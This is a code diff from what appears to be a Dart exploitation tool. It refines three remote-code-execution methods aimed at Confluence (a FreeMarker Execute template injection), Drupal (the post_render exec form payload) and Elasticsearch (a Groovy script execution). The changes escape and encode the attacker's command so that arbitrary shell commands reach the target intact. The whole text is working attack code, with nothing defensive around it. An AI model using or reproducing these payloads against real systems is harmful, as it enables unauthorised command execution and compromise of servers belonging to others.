@@ -140,13 +140,15 @@ class ConfluenceExpService {
 
   Future<String?> execRce(String cmd) async {
     try {
+      // Escape double quotes so the cmd survives inside the FreeMarker string literal.
+      final escaped = cmd.replaceAll(r'\', r'\\').replaceAll('"', r'\"');
       final res = await http
           .post(
             Uri.parse('$_base/template/aui/text-inline.vm'),
             headers: {'Content-Type': 'application/x-www-form-urlencoded'},
             body: {
               'label': _labelPayload,
-              'x': '@freemarker.template.utility.Execute@exec({"bash","-c","$cmd"})',
+              'x': '@freemarker.template.utility.Execute@exec({"bash","-c","$escaped"})',
             },
           )
           .timeout(timeout);
@@ -196,15 +198,21 @@ class DrupalExpService {
 
   Future<String?> execRce(String cmd) async {
     try {
-      final payload =
-          'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=$cmd';
+      // Pass body as a Map so http.dart URL-encodes each value; avoids cmd
+      // containing '&', '=', or '#' breaking the form field boundaries.
       final res = await http
           .post(
             Uri.parse(
               '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
             ),
             headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: payload,
+            body: {
+              'form_id': 'user_register_form',
+              '_drupal_ajax': '1',
+              'mail[#post_render][]': 'exec',
+              'mail[#type]': 'markup',
+              'mail[#markup]': cmd,
+            },
           )
           .timeout(timeout);
       return res.body.isNotEmpty ? res.body : null;
@@ -250,10 +258,17 @@ class ElasticsearchExpService {
 
   Future<String?> execRce(String cmd) async {
     try {
+      // Build the Groovy script with the command as a Groovy list to avoid
+      // any quoting issues (ES 1.x Groovy accepts GString list execution).
+      final cmdBytes = cmd.codeUnits.join(',');
       final payload = jsonEncode({
         'size': 1,
         'script_fields': {
-          'result': {'script': 'def cmd="$cmd"; def res=cmd.execute().text; res'},
+          'result': {
+            'script':
+                "def cmd=new String([$cmdBytes] as byte[]);"
+                "def res=cmd.execute().text; res",
+          },
         },
       });
       final res = await http
